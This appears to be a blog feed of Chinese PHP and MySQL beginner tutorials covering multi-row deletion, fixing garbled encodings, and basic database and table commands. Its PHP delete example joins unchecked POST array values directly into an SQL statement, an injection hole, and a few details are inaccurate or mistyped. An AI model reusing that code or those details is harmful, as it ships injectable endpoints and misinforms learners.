number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>&emsp;<br>而单选删除的语句效果就是：</p><pre class="line-numbers language-php"><code class="language-php">delete from user where id <span class="token function">in</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>&emsp;<br>这样我们就实现了单选和多选自适应效果：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"delete from user where id in($id)"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>&emsp;<br>最终配套而成的整体代码演示如下：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">'connection.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">join</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'数据不合法'</span><span class="token punctuation">;</span>   exit<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"delete from user where id in($id)"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'删除成功'</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>   <span class="token keyword">echo</span> <span class="token string">'删除失败'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h3 id="六-通过步骤修改用户信息"><font color="#FF6347" face="Comic sans MS">六. 通过步骤修改用户信息</font><a href="post/PHP-MySQL#六-通过步骤修改用户信息"></a></h3><p>内容有点多，等哪天想起来了或者心情好了再写吧…..(✿◡‿◡)</p><p><font color="#00B2EE">[<a href="http://www.php.cn/code/1277.html" target="_blank" rel="noopener">教程</a>]</font><br><font color="#00B2EE">[<a href="http://www.php.cn/code/4980.html" target="_blank" rel="noopener">视频</a>]</font></p><p>&emsp;<br>&emsp;</p><h3 id="七-数据显示乱码终极解决办法"><font color="#FF6347" face="Comic sans MS">七. 数据显示乱码终极解决办法</font><a href="post/PHP-MySQL#七-数据显示乱码终极解决办法"></a></h3><p>解决乱码问题的核心思想，就是：<font color="#FF7F00"><strong>一定要多个不同的文件系统中一定要统一编码</strong></font>。</p><p>&emsp;<br>总结成了9个要点来彻底解决连接后乱码的问题。</p><blockquote><ol><li><font color="#00B2EE"><strong>html编码与MySQL编码一致</strong></font></li><li><font color="#00B2EE"><strong>PHP编码与MySQL编码一致</strong></font></li><li><font color="#00B2EE"><strong>若有header头发送字符集，请与数据库一样</strong></font></li><li><font color="#00B2EE"><strong>&lt;meta http-equiv=“Content-Type”content=“text/html; charset=utf-8” /&gt;要和页面的文字编码一致</strong></font></li><li><font color="#00B2EE"><strong>数据库建库的字符集要统一</strong></font></li><li><font color="#00B2EE"><strong>表的字符集要统一</strong></font></li><li><font color="#00B2EE"><strong>列的字符集要统一(表设了,列就默认写表的)</strong></font></li><li><font color="#00B2EE"><strong>连接,校验的字符集要统一</strong></font></li><li><font color="#00B2EE"><strong>结果集的字符集要统一</strong></font></li></ol></blockquote><p>&emsp;<br>&emsp;<br>&emsp;<br><font color="#FF7F00"><strong>一、 文件编码</strong></font><br>html和PHP文件的编码，示例中：拿notepad++来演示。将PHP和html都要设为这种字符集。<br>一定要设置为utf-8无BOM格式。</p><div class="article-img"><p><img src="https://i.loli.net/2019/02/24/5c72764c43d27.png" alt="1" data-zoomable></p></div><p>&emsp;<br><font color="#FF7F00"><strong>二、 header头编码</strong></font><br>如果php中有header头，一定要是<strong>utf-8</strong>的<br><font color="red"></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>&emsp;<br><font color="#FF7F00"><strong>三、网页头文件编码</strong></font><br>如果html文件编码是utf-8的也要设置为一置<br><font color="red"></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup">&lt;meta http-equiv=“Content-Type”content=“text/html; charset=utf-8” /></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>&emsp;<br><font color="#FF7F00"><strong>四、创建数据库的编码</strong></font></p><div class="article-img"><p><img src="https://i.loli.net/2019/02/24/5c72789c325a2.png" alt="2" data-zoomable></p></div><p>&emsp;<br><font color="#FF7F00"><strong>五、表和列创建的时候表为utf-8</strong></font></p><div class="article-img"><p><img src="https://i.loli.net/2019/02/24/5c7278e24b5ad.png" alt="3.png" data-zoomable></p></div><p>&emsp;<br><font color="#FF7F00"><strong>六、连接，结果、校验字符集设置</strong></font></p><blockquote><p><font color="#00B2EE"><strong>1.通过mysqli_set_charset(‘utf8’)来MySQL连接、结果和校验的字符集设置。<br>2.注：数据库的字符集声明和文件中的略有不同。</strong></font><font color="red"><strong>utf8为mysql数据库的，utf-8为文件中使用的。</strong></font></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP语言 </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL入门</title>
      <link href="/post/MySQL-Primer/"/>
      <url>/post/MySQL-Primer/</url>
      
        <content type="html"><![CDATA[<p>内容好多啊◑﹏◐<font color="#00B2EE">[<a href="http://www.php.cn/code/4954.html" target="_blank" rel="noopener">那看视频吧…..</a>]</font> ٩(๑❛ᴗ❛๑)۶  (๑&gt;◡&lt;๑)</p><a id="more"></a><p>&ensp;<br>&ensp;</p><center><font color="#00B2EE" face="Comic sans MS" size="5">MySQL入门</font></center><p>&emsp;<br>&emsp;</p><h3 id="一-MySQL介绍"><font color="#FF6347" face="Comic sans MS">一. MySQL介绍</font><a href="post/MySQL-Primer#一-MySQL介绍"></a></h3><p><font color="#FF7F00"><strong>1.</strong></font>  MySQL数据库简称MySQL，是一款由瑞典MySQL AB公司开发并且应用广泛的数据管理系统，MySQL数据库因其<font color="#FF7F00">体积小、速度快、总体拥有成本低</font> 受到很多的热捧。现在,MySQL的所有者世界上最著名的数据库企业——Oracle所有。</p><p><font color="#FF7F00"><strong>2.</strong></font>  MySQL的应用，在国内的企业包括：百度、阿里、腾讯、新浪、搜狐、网易等等企业，全部都在使用MySQL数据库。</p><p><font color="#FF7F00"><strong>3.</strong></font>  MySQL是一种<font color="#FF7F00"><strong>开放源代码的关系型数据库管理系统（RDBMS）</strong></font> ，MySQL数据库系统使用最常用的数据库管理语言–结构化查询语言（SQL）进行数据库管理。<br>由于MySQL是开放源代码的，因此任何人都可以在GPL的许可下下载并根据个性化的需要对其进行修改。MySQL因为其速度、可靠性和适应性而备受关注。大多数人都认为在不需要事务化处理的情况下，MySQL是管理内容最好的选择。</p><p><font color="#FF7F00"><strong>4.</strong></font>  PHP与很多数据库结合都很紧密。由于，PHP和MySQL都是开源免费的。所以PHP一直对于MySQL等数据库都有很好的支持。</p><p>&emsp;<br>&emsp;<br><font color="#FF7F00"></font></p><blockquote><p><font color="#FF7F00"><strong>数据库的五个基本单位</strong></font></p><ol><li>数据库服务器</li><li>数据库</li><li>数据表</li><li>数据字段(列)</li><li>数据行</li></ol></blockquote><p>&emsp;<br><font color="#00B2EE"><strong>1. 数据库服务器。</strong></font>是指用来运行数据库服务的一台电脑。在中小型企业通常为一台。在数据存储量计算量很大的时候可以存在多台。多台数据库服务器共同来存储或计算。由于数据安全非常重要，我们经常会对数据库服务器里面的数据进经备份。</p><p><font color="#00B2EE"><strong>2. 数据库。</strong></font>一个数据库服务器里面有可以有多个数据库。主要用来分类使用。我们可以建立交通信息数据库、游戏数据库、酒店开房数据库… … 主要用来将各个不同用途的数据，按照业务进行大块的划分。</p><p><font color="#00B2EE"><strong>3. 数据表。</strong></font>例如在游戏数据库中。根据这一款游戏又分为了不同的数据表。专门用来区分游戏不同的数据。例如：用户数据（用户、密码）；人物数据；所有装备和装备信息；用户的充值信息；药品、魔力药水信息… …等</p><p><font color="#00B2EE"><strong>4. 数据字段，也叫数据列。</strong></font>就是我们日常所见表格里面的列。在表格中，我们会将一张用户表分成多个列。如下（表一）所示：用户编号、用户名、性别、年龄是字段。在真正的数据库中数据字段需要换成英文需要写成：id、username、sex、年龄。</p><p><font color="#00B2EE"><strong>5. 数据行。</strong></font>真正的数据存在每一个表的行里面。字段（列）划分出来了一个表应该按照什么样的格式存数据。而行，是真正的数据。每一行需要遵循数据字段（列）的规范和要求进行存入数据。</p><p>(表一)<br><font color="#FF7F00"></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">用户编号</th><th align="center">用户名</th><th align="center">性别</th><th align="center">年龄</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">李文凯</td><td align="center">男</td><td align="center">18</td></tr><tr><td align="center">2</td><td align="center">景田</td><td align="center">女</td><td align="center">16</td></tr><tr><td align="center">3</td><td align="center">宁泽涛</td><td align="center">男</td><td align="center">22</td></tr></tbody></table></div></div><p>&emsp;<br>&emsp;</p><h3 id="二-数据库语句操作类型"><font color="#FF6347" face="Comic sans MS">二. 数据库语句操作类型</font><a href="post/MySQL-Primer#二-数据库语句操作类型"></a></h3><p><font color="#FF7F00"><strong>1.</strong></font> 学习数据库安装后，最重要的就是学习SQL语句。</p><p><font color="#FF7F00"><strong>2.</strong></font> SQL是操作数据库的核心，也是本章开始的一句话：MySQL对于PHP程序员来说就是将业务转化成表结构。做好业务中的<font color="#FF7F00"><strong>增、删、改、查</strong></font>。</p><p><font color="#FF7F00"><strong>3.</strong></font> 结构化查询语言(Structured Query Language)简称SQL，是一种特殊目的的编程语言，是一种数据库查询和程序设计语言，用于存取数据以及查询、更新和管理关系数据库系统；<font color="#FF7F00"><strong>同时也是数据库脚本文件的扩展名</strong></font>。</p><p>&emsp;<br><font color="#00B2EE"><strong>一. 数据库操作语句类型（DQL、DML、DDL、DCL）简介</strong></font><br><font color="#00B2EE"><strong>1. 数据查询语言DQL</strong></font><br><strong>数据查询语言DQL基本结构是由</strong><font color="#FF7F00"><strong>SELECT子句，FROM子句，WHERE子句</strong></font><strong>组成的查询块：</strong><br><font color="#FF7F00"></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">语句</th><th align="left">功能</th></tr></thead><tbody><tr><td align="center">SELECT</td><td align="left">&lt;字段名表&gt;</td></tr><tr><td align="center">FROM</td><td align="left">&lt;表或视图名&gt;</td></tr><tr><td align="center">WHERE</td><td align="left">&lt;查询条件&gt;</td></tr></tbody></table></div></div><p>&emsp;<br><font color="#00B2EE"><strong>2 .数据操纵语言DML</strong></font><br><font color="#FF7F00"><strong>用于添加、删除、更新和查询数据库记录，并检查数据的完整性。</strong></font>数据操纵语言DML主要有三种形式：<br>1) 插入：INSERT<br>2) 更新：UPDATE<br>3) 删除：DELETE</p><p>&emsp;<br><font color="#00B2EE"><strong>3. 数据定义语言DDL</strong></font><br>数据定义语言DDL用来创建数据库中的各种对象—–表、视图、索引、同义词、聚簇等。注意：<strong>DDL操作是隐性提交的！不能rollback</strong><br>常用的语句关键字包括<br>1) CREATE：创建<br>2) DROP：删除<br>3) ALTER：修改</p><p><font color="#00B2EE"><strong>4. 数据控制语言DCL</strong></font><br>用于控制不同数据段直接的许可和访问级别的语句。这些语句定义了数据库、表、字段、用户的访问权限和安全级别。主要的语句关键字包括grant、revoke等。<br>数据控制语言DCL用来授予或回收访问数据库的某种特权，并控制。数据库操纵事务发生的时间及效果，对数据库实行监视等。如：<br>1) GRANT：授权<br>2）REVOLK：撤销</p><p>&emsp;<br>&emsp;<br><font color="#FF7F00"></font></p><h3 id="三-连接数据库"><font color="#FF6347" face="Comic sans MS">三. 连接数据库</font><a href="post/MySQL-Primer#三-连接数据库"></a></h3><p><font color="#00B2EE"><strong>方法一</strong></font><br>安装后，可以在开始菜单的列表中找到MySQL Command Line 点击操作的命令行终端操作。</p><p><font color="#00B2EE"><strong>方法二</strong></font><br>如果加入到了windows的环境变量中，可以在命令行下直接操作。<br>在命令行下，通过以下命可以连接到数据库服务器：mysql -h localhost -u root -p</p><p>参数说明：<br><font color="#FF7F00"></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">参数</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">-h</td><td align="left">表示数据库连接地址，连接本机可不填</td></tr><tr><td align="center">-u</td><td align="left">表示要登录的用户</td></tr><tr><td align="center">-p</td><td align="left">表示使用密码登录</td></tr></tbody></table></div></div><blockquote><p><font color="#FF7F00"><strong>注：</strong></font>通常我们不直接输入密码。而是在回车之后，输入密码。因为，密码输入时的字符是不可见的，输完密码直接回车登录。防止旁边有人把重要的密码看走。</p></blockquote><p>&emsp;<br>如果没有什么别的问题，登陆成功之后会出现下面内容：</p><pre class="line-numbers language-mysql"><code class="language-mysql">mysql -u root -p Enter password:  Welcome to the MySQL monitor.  Commands end with ; or \g. Your MySQL connection id is 7 Server version: 5.6.25 MySQL Community Server (GPL)Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners.Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.mysql>上面的中文意思翻译过来是说，欢迎使用MySQL的命令行操作工具。每一个命令结束可以输入\g 或者 ;mysql当前是第 7次连接。当前数据库的版本是5.6.25社区支持版。遵循GPL协议。版权所有：2000至 2015。归Oracle及其子机构拥有所有权。如果需要帮助的话，通过 ‘help;’ 或者 ‘\h’ 命令来显示帮助内容，通过 ‘\c’ 命令来清除命令行历史。mysql>mysql > 表示等待输入指令。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><font color="#FF7F00"><strong>注：</strong></font><br>在登陆成功后有这么一句提示，可能大家不太理解：<br>Your MySQL connection id is 7<br>表示第7次连接登陆，每登陆一次这个id为加1。下一次显示的会是第8次。</p></blockquote><p>&emsp;<br>&emsp;</p><h3 id="四-数据库操作"><font color="#FF6347" face="Comic sans MS">四. 数据库操作</font><a href="post/MySQL-Primer#四-数据库操作"></a></h3><h4 id="4-1-创建数据库"><font color="#3CB371" face="Comic sans MS">4.1 创建数据库</font><a href="post/MySQL-Primer#4-1-创建数据库"></a></h4><p>基本语法：<font color="#00B2EE"><strong>CREATE DATABASE 数据库名;</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">CREATE DATABASE 数据库名;</td></tr><tr><td align="center">示例</td><td align="left">CREATE DATABASE PHP;</td></tr><tr><td align="center">示例说明</td><td align="left">创建一个数库，数据库的名字为PHP</td></tr></tbody></table></div></div><blockquote><p><font color="#FF7F00"><strong>注意：<br>一个MySQL语句结尾是以英语分号(;)结束的，千万不要忘记了，不然语句是错误的！</strong></font></p></blockquote><p>&emsp;<br>示例：</p><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> <span class="token constant">CREATE</span> <span class="token constant">DATABASE</span> <span class="token constant">PHP</span><span class="token punctuation">;</span> Query <span class="token constant">OK</span><span class="token punctuation">,</span> <span class="token number">1</span> row <span class="token function">affected</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><ol><li>“Query OK” 表示上面的命令执行成功，所有的 DDL 和 DML(不包 括 SELECT)操作执行成功后都显示“Query OK”，这里理解为执行成功就可以了；“1 row affected” 表示操作只影响了数据库中一行的记录，“0.00 sec”则记录了操作执行的时间。</li><li>如果已经存在这个数据库，系统会怎么提    示:</li></ol></blockquote><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> <span class="token constant">CREATE</span> <span class="token constant">DATABASE</span> <span class="token constant">PHP</span><span class="token punctuation">;</span> <span class="token constant">ERROR</span> <span class="token function">1007</span> <span class="token punctuation">(</span><span class="token constant">HY000</span><span class="token punctuation">)</span><span class="token punctuation">:</span> Can<span class="token string">'t create database '</span><span class="token constant">PHP</span>'<span class="token punctuation">;</span> database exists<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>&emsp;</p><h4 id="4-2-查看数据库"><font color="#3CB371" face="Comic sans MS">4.2 查看数据库</font><a href="post/MySQL-Primer#4-2-查看数据库"></a></h4><p>基本语法：<font color="#00B2EE"><strong>show databases;</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">show databases;</td></tr><tr><td align="center">示例说明</td><td align="left">显示当前服务器的所有数据库</td></tr></tbody></table></div></div><blockquote><p><font color="#FF7F00"><strong>注意：</strong></font><br>show 是指显示<br>database 是指数据库<br>databases 是数据库的复数形式，指全部数据库。</p></blockquote><p>&emsp;</p><h4 id="4-3-选中数据库"><font color="#3CB371" face="Comic sans MS">4.3 选中数据库</font><a href="post/MySQL-Primer#4-3-选中数据库"></a></h4><p>基本语法：<font color="#00B2EE"><strong>use 库名;</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">use 库名;</td></tr><tr><td align="center">示例</td><td align="left">use PHP</td></tr><tr><td align="center">示例说明</td><td align="left">使用数据库PHP</td></tr></tbody></table></div></div><blockquote><p><font color="#FF7F00"><strong>注意：</strong></font></p><ol><li><font color="#FF7F00"><strong>在一个数据库里面处理数据的时候，必须先进入这个数据库，即先use 库名;</strong></font></li><li>use 是指使用；</li><li>库名 是存在当前数据库系统中的具体的数据库的名称；</li><li>出现 ” Database changed“ 表示切换成功。然后，看看mysql数据库里面有什么内容（和查看当前数据库服务器数据库一样使用 show 语句）</li></ol></blockquote><p>&emsp;</p><h4 id="4-4-查看数据库中的表"><font color="#3CB371" face="Comic sans MS">4.4 查看数据库中的表</font><a href="post/MySQL-Primer#4-4-查看数据库中的表"></a></h4><p>基本语法：<font color="#00B2EE"><strong>show tables;</strong></font><br>前提是先：<font color="#00B2EE"><strong>use 库名;</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">show tables;</td></tr><tr><td align="center">示例说明</td><td align="left">显示当前数据库下所有的表</td></tr></tbody></table></div></div><p>&emsp;</p><h4 id="4-5-删除数据库"><font color="#3CB371" face="Comic sans MS">4.5 删除数据库</font><a href="post/MySQL-Primer#4-5-删除数据库"></a></h4><p>基本语法：<font color="#00B2EE"><strong>DROP DATABASE 库名;</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">DROP DATABASE 库名;</td></tr><tr><td align="center">示例</td><td align="left">DROP DATABASE  PHP;</td></tr><tr><td align="center">示例说明</td><td align="left">删除一个数库，数据库的名字为liwenkai</td></tr></tbody></table></div></div><blockquote><p><font color="#FF7F00"><strong>注意：</strong></font></p><ol><li>drop 是汉语可以翻译为指掉下来，不要了的意思</li><li>database 是指库</li><li>库名 是指要删掉的库的名称</li></ol></blockquote><p>示例：</p><pre class="line-numbers language-php"><code class="language-php">mysql<span class="token operator">></span> <span class="token constant">DROP</span> <span class="token constant">DATABASE</span>  <span class="token constant">PHP</span><span class="token punctuation">;</span> Query <span class="token constant">OK</span><span class="token punctuation">,</span> <span class="token number">0</span> rows <span class="token function">affected</span> <span class="token punctuation">(</span><span class="token number">0.01</span> sec<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><ol><li><font color="#FF7F00"><strong>【切记】注：数据库删除后，下面的所有数据都会全部删除，所以删除前一定要慎重并做好相应的备份。（若重要数据未备份，而实际中产生的数据风险很高。）</strong></font></li><li>一定要指定好要删除的数据库的名字。</li></ol></blockquote><p>&emsp;<br>&emsp;</p><h3 id="五-数据表操作"><font color="#FF6347" face="Comic sans MS">五. 数据表操作</font><a href="post/MySQL-Primer#五-数据表操作"></a></h3><h4 id="5-1-创建数据表"><font color="#3CB371" face="Comic sans MS">5.1 创建数据表</font><a href="post/MySQL-Primer#5-1-创建数据表"></a></h4><p>基本语法：<font color="#00B2EE"><strong>CREATE TABLE 表名(字段名1 字段类型,….字段名n 字段类型n);</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">CREATE TABLE 表名(字段名1 字段类型,….字段名n 字段类型n);</td></tr><tr><td align="center">示例</td><td align="left">CREATE TABLE user(username varchar(20),password varchar(32));</td></tr><tr><td align="center">示例说明</td><td align="left">创建一个表名叫user的表，第一个字段(列)为username、表的字段类型为varchar、长度为32个<br>长度。第二个字段为password，类型也为varchar，长度也为32个长度。</td></tr></tbody></table></div></div><p>&emsp;</p><h4 id="5-2-查看表字段-列-结构信息"><font color="#3CB371" face="Comic sans MS">5.2 查看表字段(列)结构信息</font><a href="post/MySQL-Primer#5-2-查看表字段-列-结构信息"></a></h4><p>基本语法：<font color="#00B2EE"><strong>desc 表名;</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">desc 表名;</td></tr><tr><td align="center">示例</td><td align="left">desc test</td></tr><tr><td align="center">示例说明</td><td align="left">查看test表的表结构(显示出test表的每一行详细数据)</td></tr></tbody></table></div></div><p>&emsp;</p><h4 id="5-3-查看表的创建SQL语句"><font color="#3CB371" face="Comic sans MS">5.3 查看表的创建SQL语句</font><a href="post/MySQL-Primer#5-3-查看表的创建SQL语句"></a></h4><p><font color="#FF7F00"><strong>当我们不会创建数据表，或者需要参考其他已经创建好的数据表的语法，我们可以查看那些数据表的语法。</strong></font><br>基本语法：<font color="#00B2EE"><strong>SHOW CREATE TABLE 表名 [\G];</strong></font><br>如果一行很长，需要这行显示的话，看起结果来就非常的难受。在SQL语句或者命令后使用\G，可以将每一行的值垂直输出。</p><p><font color="#FF7F00"></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">类别</th><th align="left">详细解示</th></tr></thead><tbody><tr><td align="center">基本语法</td><td align="left">SHOW CREATE TABLE表名 \G;</td></tr><tr><td align="center">示例</td><td align="left">SHOW CREATE TABLE emp \G;</td></tr><tr><td align="center">示例说明</td><td align="left">查看表emp的创建语句</td></tr></tbody></table></div></div><blockquote><p><font color="#FF7F00"><strong>注：</strong></font>上面表的创建 SQL 语句中，除了可以看到表定义以外，还可以看到表的 engine（存储引擎) 和 charset(字符集)等信息。<font color="#FF7F00">“\G”选项的含义是使得记录能够按照字段竖着排列，对于内 容比较长的记录更易于显示。</font></p></blockquote><p>&emsp;</p><h4 id="5-4-指定表引擎和字符集"><font color="#3CB371" face="Comic sans MS">5.4 指定表引擎和字符集</font><a href="post/MySQL-Primer#5-4-指定表引擎和字符集"></a></h4><p>数据库引擎推荐资料：<font color="#00B2EE">[<a href="https://blog.csdn.net/gentelyang/article/details/80372045" target="_blank" rel="noopener">数据库引擎学习总结</a>]</font>、<font color="#00B2EE">[<a href="https://www.cnblogs.com/zhangjinghe/p/7599988.html" target="_blank" rel="noopener">MYSQL数据库引擎区别详解</a>]</font><br>字符集推荐资料：<font color="#00B2EE">[<a href="https://www.cnblogs.com/happyday56/p/4135845.html" target="_blank" rel="noopener">各种字符集和编码详解</a>]</font>、<font color="#00B2EE">[<a href="https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6%E9%9B%86/946585?fr=aladdin" target="_blank" rel="noopener">字符集百度百科</a>]</font></p><p>在创建表最后，我们常用MyISAM或者InnoDB引擎。在指定引擎时，我们可以使用：ENGINE=InnoDB<br>指定表默认字符集：DEFAULT CHARSET=utf8</p><p>&emsp;<br><font color="red" face="Comic sans MS"><strong>(1) Mysql表引擎</strong></font><br>MySQL的强大之处在于它的插件式存储引擎，我们可以基于表的特点使用不同的存储引擎，从而达到最好的性能。<br>基本语法：<font color="#00B2EE"><strong>show engines;</strong></font><br>可以查看到当前服务器支持的所有引擎。<br><font color="#FF7F00"></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">引擎名称</th><th align="left">特别</th></tr></thead><tbody><tr><td align="center">MyISAM</td><td align="left">常用。读取效率很高的引擎</td></tr><tr><td align="center">InnoDB</td><td align="left">常用。写入，支持事处等都支持</td></tr><tr><td align="center">Archive</td><td align="left">不常用。归档引擎，压缩比高达1:10，用于数据归档</td></tr><tr><td align="center">NDB</td><td align="left">不常用。主要在MySQL 集群服务器中使用，不做介绍</td></tr></tbody></table></div></div><blockquote><p><font color="#FF7F00"><strong>MyISAM</strong></font></p><ol><li>不支持事务，表锁(表级锁，加锁会锁住整个表)，支持全文索引,操作速度快。常用于读取多的业务。</li><li>myisam存储引擎表由myd和myi组成。.myd用来存放数据文件，.myi用来存放索引文件。</li><li>对于myisam存储引擎表，mysql数据库只缓存其索引文件，数据文件的缓存由操作系统本身来完成。</li></ol></blockquote><blockquote><p><font color="#FF7F00"><strong>InnoDB</strong></font></p><ol><li>支持事务，主要面向在线事务处理(OLTP)方面的应用。</li><li><font color="#FF7F00"><strong>行锁设计，支持外键，即默认情况下读取操作不加锁。</strong></font></li><li>InnoDB是为处理巨大数据量时的最大性能设计。</li></ol></blockquote><blockquote><p><font color="#FF7F00"><strong>注意：</strong></font></p><ol><li>行锁：写入、更新操作的时候将这一行锁起来，不让其他人再操作了。</li><li>表锁：写入、更新操作时，将表给锁起来不让其他人再操作了。</li><li>事务：同时操作多个数据，若其中的一个数据操作失败。可回滚到操作之前。常用于银行、电商、金融等系统中。</li></ol></blockquote><p>&emsp;<br><font color="red" face="Comic sans MS"><strong>(2) Mysql字符集</strong></font></p><ol><li>为了更好的识别中文、日文、英文、希腊语。对于常用的符号进行了编码，这个编码就是字符集。</li><li>字符集确定了文字的存储方式。</li><li>字符集相当于是计算机中人类的语言。</li></ol><p><font color="#FF7F00"></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">字符集</th><th align="left">说明</th><th align="left">字节长度</th></tr></thead><tbody><tr><td align="center">ASCII</td><td align="left">美国标准信息交换代码</td><td align="left">单字节</td></tr><tr><td align="center">GBK</td><td align="left">汉字内码扩展规范</td><td align="left">双字节</td></tr><tr><td align="center">unicode</td><td align="left">万国码</td><td align="left">4字节</td></tr><tr><td align="center">UTF-8</td><td align="left">Unicode的可变长度字符编码</td><td align="left">1到6个字节</td></tr></tbody></table></div></div><p><font color="#00B2EE"><strong>ASCII</strong></font><br>ASCII 码使用指定的7 位或8 位二进制数组合来表示128 或256 种可能的字符。标准ASCII 码也叫基础ASCII码，使用7 位二进制数来表示所有的大写和小写字母，数字0 到9、标点符号， 以及在美式英语中使用的特殊控制字符。<br>其中：<br>0～31及127(共33个)是控制字符或通信专用字符（其余为可显示字符），如控制符：LF（换行）、CR（回车）、FF（换页）、DEL（删除）、BS（退格)、BEL（响铃）等；通信专用字符：SOH（文头）、EOT（文尾）、ACK（确认）等；ASCII值为8、9、10 和13 